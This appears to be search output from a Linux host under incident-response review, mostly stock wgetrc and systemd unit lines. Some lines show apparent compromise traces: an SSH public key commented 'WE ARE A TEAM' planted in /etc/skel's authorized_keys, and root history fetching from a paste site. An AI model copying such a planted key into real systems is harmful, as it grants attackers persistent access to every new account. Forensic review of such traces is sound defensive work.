+/etc/wgetrc:56:# downloads, set waitretry to maximum number of seconds to wait (Wget
+/etc/wgetrc:63:## Local settings (for a user to set in his $HOME/.wgetrc).  It is
+/etc/wgetrc:67:## Even when setting up your own ~/.wgetrc, you should know what you
+/etc/wgetrc:74:# It is a good idea to make Wget send your email address in a `From:'
+/etc/wgetrc:76:# you in case of errors).  Wget does *not* send `From:' by default.
+/etc/wgetrc:83:# You can set the default proxies for Wget to use for http, https, and ftp.
+/etc/wgetrc:96:# Setting this to off makes Wget not download /robots.txt.  Be sure to
+/etc/wgetrc:101:# It can be useful to make Wget wait between connections.  Set this to
+/etc/wgetrc:102:# the number of seconds you want Wget to wait.
+/etc/wgetrc:118:# To have Wget follow FTP links from HTML files by default, set this
+/etc/skel/.ssh/authorized_keys:1:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCVezQoQgcKB58jMG4dhFNtRM8KMkkBLZQ8sb3+pR2VP6wXxRB857hO5R8i/dbD9swgRbsgG04yLDzLZ7M12o+4SCpENefdQos7aFuocCF5NRQDrEaTtWG+LsAi9lIB43dKzRnhWJ/ETZ8hw1x0R6wcbTZ2YSpYVCcNRz9i0LtMtFqFXgleep3e23Uem1uPEPhreynPDxIWIfnyK9Fwpo3z/hdtICrC7EMOV1G44CI37SvlZCxvSDRkHe3dn4T3DsxiL/dLk4T4OfFmfMHqYhlGFMMypY5n5Q/zjivAj0ul7ymjc8RSvL2744TnzqSQ7L+GdtS4cNhUOdDPJ3IxpJxW5c8gP/J5Ue7XH/hVFrD+lQx6W5h1V4BZ7HhDvsVfBSuP0i7MClzsafVYjp1nFg6uelo6rqJ5eB64pESygPM9tCHJV3LaCNRFvJo1mExkVpQ99LGm/qa5fz1AtKdELafSatzaBy9CfZBdWjN1uKQnLvGvQhBoDQVpTbEsisCCqxPlzsnFaworvtoM6Ap4bB6jpPZsxPgdJNe5HT+lJfREiw8M20L4j6SVrPaRe/Blxpq48hfRAhvU8t+PmbQFbKC4Lc1ECUIi8gCJ5EpNeFszyx2OCFDPboss3gkXNDSJWF51DAhRV2CgkMyRc0gmYrmBCLy/4FMG1XpCLp73kL/gbQ== WE ARE A TEAM
+/root/.bash_history:27:curl
+/root/.bash_history:28:curl http://cl1p.net/ntva
+/root/.bash_history:29:curl https://cl1p.net/ntva
+/root/.bash_history:166:curl http://127.0.0.1:3000/sentinel_national_png
+/root/.bash_history:171:curl http://127.0.0.1:3000/sentinel_national.png
+/root/.bash_history:173:curl http://127.0.0.1:3000/sentinel_national_logo.png
+/root/.bash_history:174:curl http://127.0.0.1:3000/login
+/root/.bash_history:176:curl http://localhost:3000/sentinel_national_logo.png
+/root/.bash_history:438:curl http://localhost:80
+/root/.bash_history:439:curl http://localhost:443
+/root/.bash_history:440:curl -k https://localhost:443
+/root/.bash_history:442:curl -k https://192.168.9.5:80
+/root/.bash_history:443:curl -k https://192.168.9.5:443
+/root/ir-resume-2026-04-18-151238/system/initrd-fs.target:18:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/soft-reboot.target:11:Description=Reboot System Userspace
+/root/ir-resume-2026-04-18-151238/system/soft-reboot.target:14:Requires=systemd-soft-reboot.service
+/root/ir-resume-2026-04-18-151238/system/soft-reboot.target:15:After=systemd-soft-reboot.service
+/root/ir-resume-2026-04-18-151238/system/soft-reboot.target:18:JobTimeoutAction=soft-reboot-force
+/root/ir-resume-2026-04-18-151238/system/system-update.target.wants/fwupd-offline-update.service:8:Before=shutdown.target system-update.target
+/root/ir-resume-2026-04-18-151238/system/system-update.target.wants/fwupd-offline-update.service:13:FailureAction=reboot
+/root/ir-resume-2026-04-18-151238/system/system-update.target.wants/packagekit-offline-update.service:7:Before=shutdown.target system-update.target
+/root/ir-resume-2026-04-18-151238/system/system-update.target.wants/packagekit-offline-update.service:15:FailureAction=reboot
+/root/ir-resume-2026-04-18-151238/system/cloud-init-local.service:9:Before=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/cloud-init-local.service:11:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/dm-event.service:6:Before=local-fs-pre.target shutdown.target
+/root/ir-resume-2026-04-18-151238/system/dm-event.service:7:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-backlight@.service:16:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-backlight@.service:17:Before=sysinit.target shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-sysusers.service:22:Conflicts=shutdown.target initrd-switch-root.target
+/root/ir-resume-2026-04-18-151238/system/systemd-sysusers.service:23:Before=shutdown.target initrd-switch-root.target
+/root/ir-resume-2026-04-18-151238/system/final.target:11:Description=Late Shutdown Services
+/root/ir-resume-2026-04-18-151238/system/final.target:15:After=shutdown.target umount.target
+/root/ir-resume-2026-04-18-151238/system/systemd-pcrlock-firmware-code.service:14:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-pcrlock-firmware-code.service:16:Before=sysinit.target shutdown.target systemd-pcrlock-make-policy.service
+/root/ir-resume-2026-04-18-151238/system/systemd-pcrlock-secureboot-authority.service:11:Description=Lock UEFI SecureBoot Authority to TPM2 PCR Policy
+/root/ir-resume-2026-04-18-151238/system/systemd-pcrlock-secureboot-authority.service:14:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-pcrlock-secureboot-authority.service:16:Before=sysinit.target shutdown.target systemd-pcrlock-make-policy.service
+/root/ir-resume-2026-04-18-151238/system/systemd-pcrlock-secureboot-authority.service:23:ExecStart=/usr/lib/systemd/systemd-pcrlock lock-secureboot-authority
+/root/ir-resume-2026-04-18-151238/system/dbus.socket:3:# Do not stop on shutdown
+/root/ir-resume-2026-04-18-151238/system/systemd-networkd-wait-online.service:15:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-networkd-wait-online.service:18:Before=network-online.target shutdown.target
+/root/ir-resume-2026-04-18-151238/system/multipath-tools.service:4:Before=local-fs-pre.target blk-availability.service shutdown.target
+/root/ir-resume-2026-04-18-151238/system/multipath-tools.service:10:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/lvm2-lvmpolld.service:5:Before=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/lvm2-lvmpolld.service:8:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-modules-load.service:14:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-modules-load.service:15:Before=sysinit.target shutdown.target
+/root/ir-resume-2026-04-18-151238/system/sysinit.target.wants/systemd-sysusers.service:22:Conflicts=shutdown.target initrd-switch-root.target
+/root/ir-resume-2026-04-18-151238/system/sysinit.target.wants/systemd-sysusers.service:23:Before=shutdown.target initrd-switch-root.target
+/root/ir-resume-2026-04-18-151238/system/sysinit.target.wants/systemd-modules-load.service:14:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/sysinit.target.wants/systemd-modules-load.service:15:Before=sysinit.target shutdown.target
+/root/ir-resume-2026-04-18-151238/system/sysinit.target.wants/multipathd.service:4:Before=local-fs-pre.target blk-availability.service shutdown.target
+/root/ir-resume-2026-04-18-151238/system/sysinit.target.wants/multipathd.service:10:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/sysinit.target.wants/systemd-binfmt.service:16:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/sysinit.target.wants/systemd-binfmt.service:20:Before=sysinit.target shutdown.target
+/root/ir-resume-2026-04-18-151238/system/sysinit.target.wants/systemd-hwdb-update.service:22:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/sysinit.target.wants/systemd-hwdb-update.service:23:Before=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/sysinit.target.wants/open-iscsi.service:8:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/sysinit.target.wants/open-iscsi.service:9:Before=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/sysinit.target.wants/systemd-journal-catalog-update.service:19:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/sysinit.target.wants/systemd-journal-catalog-update.service:20:Before=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/sysinit.target.wants/systemd-firstboot.service:28:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/sysinit.target.wants/systemd-firstboot.service:29:Before=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/sysinit.target.wants/proc-sys-fs-binfmt_misc.automount:20:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/sysinit.target.wants/proc-sys-fs-binfmt_misc.automount:21:Before=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/sysinit.target.wants/finalrd.service:4:Description=Create final runtime dir for shutdown pivot root
+/root/ir-resume-2026-04-18-151238/system/sysinit.target.wants/finalrd.service:8:Conflicts=shutdown.target umount.target
+/root/ir-resume-2026-04-18-151238/system/sysinit.target.wants/finalrd.service:9:Before=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/sysinit.target.wants/systemd-tmpfiles-setup-dev-early.service:17:Conflicts=shutdown.target initrd-switch-root.target
+/root/ir-resume-2026-04-18-151238/system/sysinit.target.wants/systemd-tmpfiles-setup-dev-early.service:18:Before=shutdown.target initrd-switch-root.target
+/root/ir-resume-2026-04-18-151238/system/sysinit.target.wants/systemd-pstore.service:16:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/sysinit.target.wants/systemd-pstore.service:17:Before=sysinit.target shutdown.target
+/root/ir-resume-2026-04-18-151238/system/sysinit.target.wants/systemd-pcrphase-sysinit.service:14:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/sysinit.target.wants/systemd-pcrphase-sysinit.service:16:Before=basic.target shutdown.target
+/root/ir-resume-2026-04-18-151238/system/sysinit.target.wants/systemd-update-done.service:14:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/sysinit.target.wants/systemd-update-done.service:16:Before=sysinit.target shutdown.target
+/root/ir-resume-2026-04-18-151238/system/sysinit.target.wants/systemd-random-seed.service:22:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/sysinit.target.wants/systemd-random-seed.service:23:Before=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/sysinit.target.wants/systemd-tpm2-setup.service:14:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/sysinit.target.wants/systemd-tpm2-setup.service:16:Before=sysinit.target shutdown.target
+/root/ir-resume-2026-04-18-151238/system/sysinit.target.wants/lvm2-lvmpolld.socket:5:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/sysinit.target.wants/systemd-sysctl.service:14:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/sysinit.target.wants/systemd-sysctl.service:16:Before=sysinit.target shutdown.target
+/root/ir-resume-2026-04-18-151238/system/sysinit.target.wants/blk-availability.service:3:Before=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/sysinit.target.wants/blk-availability.service:4:After=iscsi-shutdown.service iscsi.service iscsid.service fcoe.service rbdmap.service
+/root/ir-resume-2026-04-18-151238/system/sysinit.target.wants/blk-availability.service:6:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/sysinit.target.wants/lvm2-monitor.service:6:Before=local-fs-pre.target shutdown.target
+/root/ir-resume-2026-04-18-151238/system/sysinit.target.wants/lvm2-monitor.service:8:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/sysinit.target.wants/systemd-pcrmachine.service:14:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/sysinit.target.wants/systemd-pcrmachine.service:15:Before=sysinit.target shutdown.target
+/root/ir-resume-2026-04-18-151238/system/sysinit.target.wants/systemd-repart.service:26:Conflicts=shutdown.target initrd-switch-root.target
+/root/ir-resume-2026-04-18-151238/system/sysinit.target.wants/systemd-repart.service:27:Before=shutdown.target initrd-switch-root.target
+/root/ir-resume-2026-04-18-151238/system/sysinit.target.wants/ldconfig.service:20:Conflicts=shutdown.target initrd-switch-root.target
+/root/ir-resume-2026-04-18-151238/system/sysinit.target.wants/ldconfig.service:21:Before=shutdown.target initrd-switch-root.target
+/root/ir-resume-2026-04-18-151238/system/sysinit.target.wants/systemd-tmpfiles-setup.service:17:Conflicts=shutdown.target initrd-switch-root.target
+/root/ir-resume-2026-04-18-151238/system/sysinit.target.wants/systemd-tmpfiles-setup.service:18:Before=shutdown.target initrd-switch-root.target
+/root/ir-resume-2026-04-18-151238/system/sysinit.target.wants/systemd-pcrphase.service:22:ExecStop=/usr/lib/systemd/systemd-pcrextend --graceful shutdown
+/root/ir-resume-2026-04-18-151238/system/sysinit.target.wants/systemd-update-utmp.service:11:Description=Record System Boot/Shutdown in UTMP
+/root/ir-resume-2026-04-18-151238/system/sysinit.target.wants/systemd-update-utmp.service:18:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/sysinit.target.wants/systemd-update-utmp.service:19:Before=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/sysinit.target.wants/systemd-update-utmp.service:25:ExecStart=/usr/lib/systemd/systemd-update-utmp reboot
+/root/ir-resume-2026-04-18-151238/system/sysinit.target.wants/systemd-update-utmp.service:26:ExecStop=/usr/lib/systemd/systemd-update-utmp shutdown
+/root/ir-resume-2026-04-18-151238/system/sysinit.target.wants/systemd-machine-id-commit.service:14:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/sysinit.target.wants/systemd-machine-id-commit.service:15:Before=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/sysinit.target.wants/systemd-tmpfiles-setup-dev.service:18:Conflicts=shutdown.target initrd-switch-root.target
+/root/ir-resume-2026-04-18-151238/system/sysinit.target.wants/systemd-tmpfiles-setup-dev.service:19:Before=shutdown.target initrd-switch-root.target
+/root/ir-resume-2026-04-18-151238/system/sysinit.target.wants/systemd-timesyncd.service:17:Before=time-set.target sysinit.target shutdown.target
+/root/ir-resume-2026-04-18-151238/system/sysinit.target.wants/systemd-timesyncd.service:18:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/sysinit.target.wants/systemd-tpm2-setup-early.service:14:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/sysinit.target.wants/systemd-tpm2-setup-early.service:15:Before=sysinit.target shutdown.target
+/root/ir-resume-2026-04-18-151238/system/sysinit.target.wants/systemd-ask-password-console.path:21:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/sysinit.target.wants/systemd-ask-password-console.path:22:Before=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/sysinit.target.wants/systemd-resolved.service:19:Before=sysinit.target network.target nss-lookup.target shutdown.target initrd-switch-root.target
+/root/ir-resume-2026-04-18-151238/system/sysinit.target.wants/systemd-resolved.service:20:Conflicts=shutdown.target initrd-switch-root.target
+/root/ir-resume-2026-04-18-151238/system/sysinit.target.wants/systemd-journald.service:18:# To avoid journald SIGKILLed during soft-reboot and corrupting journals.
+/root/ir-resume-2026-04-18-151238/system/sysinit.target.wants/systemd-journald.service:20:Before=soft-reboot.target
+/root/ir-resume-2026-04-18-151238/system/sysinit.target.wants/systemd-journald.service:21:Conflicts=soft-reboot.target
+/root/ir-resume-2026-04-18-151238/system/redis.service:9:ExecStop=/usr/local/bin/redis-cli shutdown
+/root/ir-resume-2026-04-18-151238/system/cloud-init.target.wants/cloud-init-local.service:9:Before=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/cloud-init.target.wants/cloud-init-local.service:11:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/cloud-init.target.wants/cloud-init.service:16:Before=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/cloud-init.target.wants/cloud-init.service:17:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-sysext@.service:15:Conflicts=shutdown.target initrd-switch-root.target
+/root/ir-resume-2026-04-18-151238/system/systemd-sysext@.service:16:Before=shutdown.target initrd-switch-root.target
+/root/ir-resume-2026-04-18-151238/system/multipathd.service:4:Before=local-fs-pre.target blk-availability.service shutdown.target
+/root/ir-resume-2026-04-18-151238/system/multipathd.service:10:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-ask-password-wall.path:18:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-ask-password-wall.path:19:Before=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-fsck@.service:15:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-fsck@.service:18:Before=systemd-quotacheck.service shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-binfmt.service:16:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-binfmt.service:20:Before=sysinit.target shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-pcrlock-file-system.service:14:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-pcrlock-file-system.service:15:Before=sysinit.target shutdown.target systemd-pcrlock-make-policy.service
+/root/ir-resume-2026-04-18-151238/system/pam_namespace.service:3:Before=multi-user.target shutdown.target
+/root/ir-resume-2026-04-18-151238/system/pam_namespace.service:4:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/initrd-root-device.target.wants/remote-cryptsetup.target:15:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/initrd-root-device.target.wants/remote-veritysetup.target:15:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/shutdown.target:11:Description=System Shutdown
+/root/ir-resume-2026-04-18-151238/system/iscsi.service:8:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/iscsi.service:9:Before=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-hwdb-update.service:22:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-hwdb-update.service:23:Before=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/dbus.service:5:# Do not stop on shutdown
+/root/ir-resume-2026-04-18-151238/system/friendly-recovery.service:4:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/kexec.target:11:Description=Reboot via kexec
+/root/ir-resume-2026-04-18-151238/system/remote-fs.target:15:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/open-iscsi.service:8:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/open-iscsi.service:9:Before=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/sockets.target.wants/dbus.socket:3:# Do not stop on shutdown
+/root/ir-resume-2026-04-18-151238/system/sockets.target.wants/systemd-networkd.socket:15:Before=sockets.target shutdown.target
+/root/ir-resume-2026-04-18-151238/system/sockets.target.wants/systemd-networkd.socket:16:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-exit.service:14:Requires=shutdown.target umount.target final.target
+/root/ir-resume-2026-04-18-151238/system/systemd-exit.service:15:After=shutdown.target umount.target final.target
+/root/ir-resume-2026-04-18-151238/system/systemd-network-generator.service:17:Conflicts=shutdown.target initrd-switch-root.target
+/root/ir-resume-2026-04-18-151238/system/systemd-network-generator.service:18:Before=shutdown.target initrd-switch-root.target
+/root/ir-resume-2026-04-18-151238/system/systemd-pcrfs-root.service:14:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-pcrfs-root.service:16:Before=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/securebootmgr.service:2:Description=Service Unit File - securebootmgr.service
+/root/ir-resume-2026-04-18-151238/system/systemd-journal-catalog-update.service:19:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-journal-catalog-update.service:20:Before=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/initrd-root-fs.target.wants/systemd-repart.service:26:Conflicts=shutdown.target initrd-switch-root.target
+/root/ir-resume-2026-04-18-151238/system/initrd-root-fs.target.wants/systemd-repart.service:27:Before=shutdown.target initrd-switch-root.target
+/root/ir-resume-2026-04-18-151238/system/systemd-firstboot.service:28:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-firstboot.service:29:Before=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-remount-fs.service:19:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-remount-fs.service:20:Before=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/proc-sys-fs-binfmt_misc.automount:20:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/proc-sys-fs-binfmt_misc.automount:21:Before=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-networkd.service:18:Before=network.target multi-user.target shutdown.target initrd-switch-root.target
+/root/ir-resume-2026-04-18-151238/system/systemd-networkd.service:19:Conflicts=shutdown.target initrd-switch-root.target
+/root/ir-resume-2026-04-18-151238/system/quotaon.service:19:Before=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-sysupdate-reboot.service:11:Description=Reboot Automatically After System Update
+/root/ir-resume-2026-04-18-151238/system/systemd-sysupdate-reboot.service:12:Documentation=man:systemd-sysupdate-reboot.service(8)
+/root/ir-resume-2026-04-18-151238/system/systemd-sysupdate-reboot.service:17:ExecStart=/usr/lib/systemd/systemd-sysupdate reboot
+/root/ir-resume-2026-04-18-151238/system/systemd-sysupdate-reboot.service:20:Also=systemd-sysupdate-reboot.timer
+/root/ir-resume-2026-04-18-151238/system/finalrd.service:4:Description=Create final runtime dir for shutdown pivot root
+/root/ir-resume-2026-04-18-151238/system/finalrd.service:8:Conflicts=shutdown.target umount.target
+/root/ir-resume-2026-04-18-151238/system/finalrd.service:9:Before=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-pcrlock-make-policy.service:14:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-pcrlock-make-policy.service:16:Before=sysinit.target shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-tmpfiles-clean.service:16:Conflicts=shutdown.target initrd-switch-root.target
+/root/ir-resume-2026-04-18-151238/system/systemd-tmpfiles-clean.service:17:Before=shutdown.target initrd-switch-root.target
+/root/ir-resume-2026-04-18-151238/system/plymouth-poweroff.service:4:Before=systemd-poweroff.service
+/root/ir-resume-2026-04-18-151238/system/plymouth-poweroff.service:12:ExecStart=/usr/sbin/plymouthd --mode=shutdown --attach-to-session
+/root/ir-resume-2026-04-18-151238/system/plymouth-switch-root-initramfs.service:4:# dracut-shutdown.service restores the initramfs when it is _stopped_
+/root/ir-resume-2026-04-18-151238/system/plymouth-switch-root-initramfs.service:6:Conflicts=dracut-shutdown.service
+/root/ir-resume-2026-04-18-151238/system/plymouth-switch-root-initramfs.service:7:After=plymouth-halt.service plymouth-reboot.service plymouth-poweroff.service plymouth-kexec.service dracut-shutdown.service mkinitcpio-generate-shutdown-ramfs.service
+/root/ir-resume-2026-04-18-151238/system/plymouth-switch-root-initramfs.service:9:ConditionPathExists=|/run/initramfs/shutdown
+/root/ir-resume-2026-04-18-151238/system/nginx.service:6:# and sends SIGTERM (fast shutdown) to the main process.
+/root/ir-resume-2026-04-18-151238/system/reboot.target:11:Description=System Reboot
+/root/ir-resume-2026-04-18-151238/system/reboot.target:14:Requires=systemd-reboot.service
+/root/ir-resume-2026-04-18-151238/system/reboot.target:15:After=systemd-reboot.service
+/root/ir-resume-2026-04-18-151238/system/reboot.target:18:JobTimeoutAction=reboot-force
+/root/ir-resume-2026-04-18-151238/system/systemd-rfkill.service:17:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-rfkill.service:19:Before=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-growfs-root.service:16:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-growfs-root.service:17:Before=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-ask-password-plymouth.service:5:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-ask-password-plymouth.service:7:Before=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/initrd.target.wants/systemd-pcrphase-initrd.service:14:Conflicts=shutdown.target initrd-switch-root.target
+/root/ir-resume-2026-04-18-151238/system/initrd.target.wants/systemd-pcrphase-initrd.service:15:Before=sysinit.target cryptsetup-pre.target cryptsetup.target shutdown.target initrd-switch-root.target systemd-sysext.service
+/root/ir-resume-2026-04-18-151238/system/initrd.target.wants/systemd-battery-check.service:25:FailureAction=poweroff-force
+/root/ir-resume-2026-04-18-151238/system/initrd.target.wants/systemd-bsod.service:16:Before=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/initrd.target.wants/systemd-bsod.service:17:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/ctrl-alt-del.target:11:Description=System Reboot
+/root/ir-resume-2026-04-18-151238/system/ctrl-alt-del.target:14:Requires=systemd-reboot.service
+/root/ir-resume-2026-04-18-151238/system/ctrl-alt-del.target:15:After=systemd-reboot.service
+/root/ir-resume-2026-04-18-151238/system/ctrl-alt-del.target:18:JobTimeoutAction=reboot-force
+/root/ir-resume-2026-04-18-151238/system/systemd-pcrfs@.service:15:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-pcrfs@.service:17:Before=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-tmpfiles-setup-dev-early.service:17:Conflicts=shutdown.target initrd-switch-root.target
+/root/ir-resume-2026-04-18-151238/system/systemd-tmpfiles-setup-dev-early.service:18:Before=shutdown.target initrd-switch-root.target
+/root/ir-resume-2026-04-18-151238/system/systemd-pstore.service:16:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-pstore.service:17:Before=sysinit.target shutdown.target
+/root/ir-resume-2026-04-18-151238/system/ua-reboot-cmds.service:2:# is required immediately after the next reboot.
+/root/ir-resume-2026-04-18-151238/system/ua-reboot-cmds.service:9:Description=Ubuntu Pro reboot cmds
+/root/ir-resume-2026-04-18-151238/system/ua-reboot-cmds.service:10:ConditionPathExists=|/var/lib/ubuntu-advantage/marker-reboot-cmds-required
+/root/ir-resume-2026-04-18-151238/system/ua-reboot-cmds.service:17:ExecStart=/usr/bin/python3 /usr/lib/ubuntu-advantage/reboot_cmds.py
+/root/ir-resume-2026-04-18-151238/system/systemd-fsckd.service:13:Before=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-networkd.socket:15:Before=sockets.target shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-networkd.socket:16:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/final.target.wants/snapd.system-shutdown.service:2:Description=Ubuntu core (all-snaps) system shutdown helper setup service
+/root/ir-resume-2026-04-18-151238/system/final.target.wants/snapd.system-shutdown.service:9:# don't run if system-shutdown isn't there
+/root/ir-resume-2026-04-18-151238/system/final.target.wants/snapd.system-shutdown.service:10:ConditionPathExists=/usr/lib/snapd/system-shutdown
+/root/ir-resume-2026-04-18-151238/system/final.target.wants/snapd.system-shutdown.service:17:ExecStart=/bin/cp /usr/lib/snapd/system-shutdown /run/initramfs/shutdown
+/root/ir-resume-2026-04-18-151238/system/remote-cryptsetup.target:15:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/snapd.system-shutdown.service:2:Description=Ubuntu core (all-snaps) system shutdown helper setup service
+/root/ir-resume-2026-04-18-151238/system/snapd.system-shutdown.service:9:# don't run if system-shutdown isn't there
+/root/ir-resume-2026-04-18-151238/system/snapd.system-shutdown.service:10:ConditionPathExists=/usr/lib/snapd/system-shutdown
+/root/ir-resume-2026-04-18-151238/system/snapd.system-shutdown.service:17:ExecStart=/bin/cp /usr/lib/snapd/system-shutdown /run/initramfs/shutdown
+/root/ir-resume-2026-04-18-151238/system/plymouth-kexec.service:2:Description=Show Plymouth Reboot with kexec Screen
+/root/ir-resume-2026-04-18-151238/system/plymouth-kexec.service:12:ExecStart=/usr/sbin/plymouthd --mode=shutdown --attach-to-session
+/root/ir-resume-2026-04-18-151238/system/systemd-journald@.service:16:# To avoid journald SIGKILLed during soft-reboot and corrupting journals.
+/root/ir-resume-2026-04-18-151238/system/systemd-journald@.service:18:Before=soft-reboot.target
+/root/ir-resume-2026-04-18-151238/system/systemd-journald@.service:19:Conflicts=soft-reboot.target
+/root/ir-resume-2026-04-18-151238/system/systemd-pcrphase-sysinit.service:14:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-pcrphase-sysinit.service:16:Before=basic.target shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-update-done.service:14:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/systemd-update-done.service:16:Before=sysinit.target shutdown.target
+/root/ir-resume-2026-04-18-151238/system/auditd.service:11:Before=sysinit.target shutdown.target
+/root/ir-resume-2026-04-18-151238/system/auditd.service:12:##Before=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/auditd.service:13:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/multi-user.target.wants/systemd-ask-password-wall.path:18:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/multi-user.target.wants/systemd-ask-password-wall.path:19:Before=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/multi-user.target.wants/dbus.service:5:# Do not stop on shutdown
+/root/ir-resume-2026-04-18-151238/system/multi-user.target.wants/remote-fs.target:15:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-151238/system/multi-user.target.wants/systemd-networkd.service:18:Before=network.target multi-user.target shutdown.target initrd-switch-root.target
+/root/ir-resume-2026-04-18-151238/system/multi-user.target.wants/systemd-networkd.service:19:Conflicts=shutdown.target initrd-switch-root.target
